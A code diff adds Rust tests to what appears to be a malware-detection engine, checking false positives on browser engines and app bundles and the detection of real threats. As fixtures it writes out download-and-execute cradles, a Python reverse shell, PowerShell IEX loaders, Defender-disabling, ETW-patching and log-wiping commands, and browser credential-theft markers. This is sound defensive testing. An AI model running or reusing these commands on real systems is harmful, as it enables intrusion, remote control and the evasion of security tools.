@@ -105,6 +105,124 @@ fn remote_access_trojan_capabilities_in_programs() {
     }
 }
 
+/// Filler that is neither text nor a single repeated byte (which would look like
+/// anti-AV padding).
+fn noise(len: usize) -> Vec<u8> {
+    let mut x = 0x9E37_79B9_7F4A_7C15u64;
+    (0..len)
+        .map(|_| {
+            x ^= x << 13;
+            x ^= x >> 7;
+            x ^= x << 17;
+            (x >> 56) as u8
+        })
+        .collect()
+}
+
+const CHROMIUM_MARKERS: &str = "Chrome_WidgetWin_1 v8_context_snapshot.bin chrome-extension:// chrome://gpu";
+/// What Chromium's sandbox, screen capture, input handling and password manager look like to the rules.
+const CHROMIUM_APIS: &str = "CreateDesktopW SetThreadDesktop PrintWindow BitBlt SetWindowsHookExW CallNextHookEx GetForegroundWindow \
+     GetWindowTextW content.proto.EmbedderDownloadData /.exec(ipchars) b.eval(s.eval(xy)) logins.json encrypted_key CryptUnprotectData \
+     \\Login Data \\Google\\Chrome\\User Data \\Microsoft\\Edge\\User Data \\Mozilla\\Firefox\\Profiles \\CurrentVersion\\Run";
+
+#[test]
+fn chromium_based_programs_stay_below_alert_threshold() {
+    let engine = engine();
+    // An unsigned Electron app or libcef.dll: the engine's own capabilities, spread through a huge binary.
+    let mut data = noise(BROWSER_ENGINE_SIZE);
+    for (i, s) in [CHROMIUM_MARKERS, CHROMIUM_APIS].iter().enumerate() {
+        let at = (i + 1) * BROWSER_ENGINE_SIZE / 3;
+        data[at..at + s.len()].copy_from_slice(s.as_bytes());
+    }
+    let (_, findings) = engine.analyze_buffer("ExifCleaner.exe", &data, Kind::Pe, 0);
+    let total = findings.iter().map(|f| f.weight).sum::<i32>() + 5; // + sig.unsigned
+    assert!(total < SUSPICIOUS, "{total} {findings:?}");
+    assert!(findings.iter().any(|f| f.id == "rule.info.chromium_engine"), "{findings:?}");
+
+    // The same strings in a small program are not a browser engine.
+    let small = format!("{CHROMIUM_MARKERS} {CHROMIUM_APIS} lpDesktop");
+    let (score, findings) = score(&engine, "hvnc.exe", &small, Kind::Pe);
+    assert!(score >= MALICIOUS, "{score} {findings:?}");
+    assert!(!findings.iter().any(|f| f.id == "rule.info.chromium_engine"));
+}
+
+#[test]
+fn bundled_javascript_and_python_test_suites_stay_below_alert_threshold() {
+    let engine = engine();
+    let gap = " ".repeat(600);
+    let cases = [
+        // VS Code's terminal auto-approve rules and PowerShell command tables.
+        (
+            "workbench.desktop.main.js",
+            format!(
+                r#"{{"Invoke-RestMethod":!1,"Invoke-WebRequest":!1,irm:!1,iwr:!1,eval:!1,"Invoke-Expression":!1,iex:!1}}
+                c=new Set(["get-service","invoke-expression","invoke-restmethod","invoke-webrequest","irm","iwr"]),
+                l=["write-output","iex","irm","iwr"];{gap}o.push(`Invoke-Expression (${{s}})`);
+                {gap}let n=this.permissionRequests.get(e);{gap}/^\$(?<plain>[A-Za-z_]*)$/.exec(t)"#
+            ),
+        ),
+        // LM Studio: local API docs, and its own install instruction far away.
+        (
+            "main_window.js",
+            format!("{{children:\"curl http://127.0.0.1:1234/api/v1/chat\"}}{gap}{gap}{{text:\"irm https://lmstudio.ai/install.ps1 | iex\"}}"),
+        ),
+        // Chrome's lists of commands seen in paste-and-run attacks.
+        ("clickfix.js", "Loaders curl,wget,invoke-webrequest,iwr,invoke-restmethod,irm Runners powershell,cmd,invoke-expression,iex,bash".to_string()),
+        (
+            "test_urllib2.py",
+            format!(
+                "def test_basic(self):\n    r = urllib.request.urlopen(self.url){gap}\n    exec(compile(src, 'x', 'exec'))\n\
+                 s = socket.socket(socket.AF_INET){gap}\n    data = s.recv(1024){gap}\n    p = subprocess.Popen(cmd){gap}\n    s.sendall(b'ok')"
+            ),
+        ),
+    ];
+    for (name, text) in cases {
+        // Even with .js counted as risky (as for a download), the content itself is clean.
+        let (score, findings) = score(&engine, name, &text, Kind::Script);
+        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
+        assert!(!findings.iter().any(|f| f.id.starts_with("rule.")), "{name}: {findings:?}");
+    }
+}
+
+#[test]
+fn compact_script_cradles_and_shells_are_still_detected() {
+    let engine = engine();
+    let cases = [
+        ("run.py", "exec(requests.get('https://example.invalid/p').text)", Kind::Script),
+        ("stage.py", "r = urllib.request.urlopen(u)\ncode = r.read().decode()\nexec(code)", Kind::Script),
+        (
+            "shell.py",
+            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.0.2.1',4444))\n\
+             p=subprocess.Popen(['cmd.exe'],stdin=PIPE,stdout=PIPE)\nwhile True:\n d=s.recv(1024);p.stdin.write(d);s.send(p.stdout.read(1))",
+            Kind::Script,
+        ),
+        (
+            "invoice.js",
+            "new ActiveXObject('WScript.Shell').Run(\"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/a')\")",
+            Kind::Script,
+        ),
+        // A command list doesn't hide a real cradle elsewhere in the file.
+        ("tool.ps1", "$deny = @('Invoke-WebRequest', 'iex'); Invoke-WebRequest -Uri $u -OutFile $f; IEX (Get-Content $f -Raw)", Kind::Script),
+        ("update.cmd", "powershell -nop -c \"curl.exe http://example.invalid/a.ps1 | iex\"", Kind::Script),
+        ("dropper.exe","powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')\"", Kind::Pe),
+    ];
+    for (name, text, kind) in cases {
+        let (score, findings) = score(&engine, name, text, kind);
+        assert!(score >= SUSPICIOUS, "{name}: {score} {findings:?}");
+    }
+}
+
+#[test]
+fn javascript_is_risky_only_when_it_came_from_the_internet() {
+    let risky = |name, source, downloaded| name_findings(name, Kind::Script, source, downloaded).iter().any(|f| f.id == "name.risky_ext");
+    assert!(!risky("main.js", Source::Manual, false));
+    assert!(!risky("main.js", Source::Folder, false));
+    assert!(risky("invoice.js", Source::Manual, true));
+    assert!(risky("invoice.js", Source::Downloads, true));
+    assert!(!risky("ui.js", Source::Steam, true));
+    assert!(risky("setup.vbs", Source::Manual, false));
+}
+
 #[test]
 fn encoded_and_split_payloads_retain_verdict_without_duplicate_points() {
     let engine = engine();
@@ -253,4 +371,62 @@ fn broken_signatures_only_ignored_while_steam_is_still_downloading() {
     // Certificate trust doesn't depend on the file being complete.
     let untrusted = Signature::Invalid(InvalidReason::Untrusted);
     assert_eq!(ids(untrusted, Source::SteamDownload).as_deref(), Some("sig.untrusted"));
+}
+
+#[test]
+fn defense_evasion_techniques_are_detected() {
+    let engine = engine();
+    let scripts = [
+        ("defender.ps1", "Set-MpPreference -DisableRealtimeMonitoring:$true; IEX (New-Object Net.WebClient).DownloadString('https://example.invalid')", MALICIOUS),
+        ("logging.ps1", "[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')", SUSPICIOUS),
+        (
+            "etw.ps1",
+            "$a = GetProcAddress ntdll EtwEventWrite; VirtualProtect($a, 1, 0x40, [ref]0); [Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 1)",
+            SUSPICIOUS,
+        ),
+        ("wipe.cmd", "wevtutil cl Security & powershell -c \"IEX (iwr https://example.invalid).Content; Invoke-WebRequest\"", MALICIOUS),
+    ];
+    for (name, text, threshold) in scripts {
+        let (score, findings) = score(&engine, name, text, Kind::Script);
+        assert!(score >= threshold, "{name}: {score} {findings:?}");
+    }
+    let programs = [
+        ("policy.exe", "SOFTWARE\\Policies\\Microsoft\\Windows Defender DisableAntiSpyware wevtutil cl System", SUSPICIOUS),
+        ("excl.exe", "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths sc stop WinDefend", SUSPICIOUS),
+        ("killer.exe", "sc create rt type= kernel binPath= C:\\ProgramData\\RTCore64.sys \\CurrentVersion\\Run", SUSPICIOUS),
+        ("unhook.exe", "\\KnownDlls\\ntdll.dll .text VirtualProtect NtMapViewOfSection advfirewall set allprofiles state off", SUSPICIOUS),
+    ];
+    for (name, text, threshold) in programs {
+        let (score, findings) = score(&engine, name, text, Kind::Pe);
+        assert!(score >= threshold, "{name}: {score} {findings:?}");
+    }
+}
+
+#[test]
+fn ordinary_security_administration_stays_clean() {
+    let engine = engine();
+    let cases = [
+        ("fw.ps1", "netsh advfirewall firewall add rule name=Game dir=in action=allow; Set-NetFirewallProfile -All -Enabled True", Kind::Script),
+        ("logs.cmd", "wevtutil qe System /c:10 /f:text & sc query WinDefend", Kind::Script),
+        ("gpo.ps1", "Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender -Name DisableAntiSpyware -Value 0", Kind::Script),
+        ("agent.ps1", "New-Service -Name MyAgent -BinaryPathName C:\\Tools\\agent.exe", Kind::Script),
+        ("defs.cmd", "MpCmdRun.exe -RemoveDefinitions -DynamicSignatures", Kind::Script),
+        ("tuner.exe", "CreateService RTCore64.sys", Kind::Pe),
+    ];
+    for (name, text, kind) in cases {
+        let (score, findings) = score(&engine, name, text, kind);
+        assert!(score < SUSPICIOUS, "{name}: {score} {findings:?}");
+    }
+}
+
+#[test]
+fn system_program_names_outside_windows_are_impostors() {
+    let root = r"C:\Windows";
+    let impostor = |p: &str| filetype::impostor_finding(Path::new(p), root).is_some();
+    assert!(impostor(r"C:\Users\me\AppData\Roaming\svchost.exe"));
+    assert!(impostor(r"C:\Windows\Temp\lsass.exe"));
+    assert!(impostor(r"C:\Windows\System32\Tasks\csrss.exe"));
+    assert!(!impostor(r"C:\Windows\System32\svchost.exe"));
+    assert!(!impostor(r"C:\Windows\explorer.exe"));
+    assert!(!impostor(r"C:\Users\me\Downloads\setup.exe"));
 }
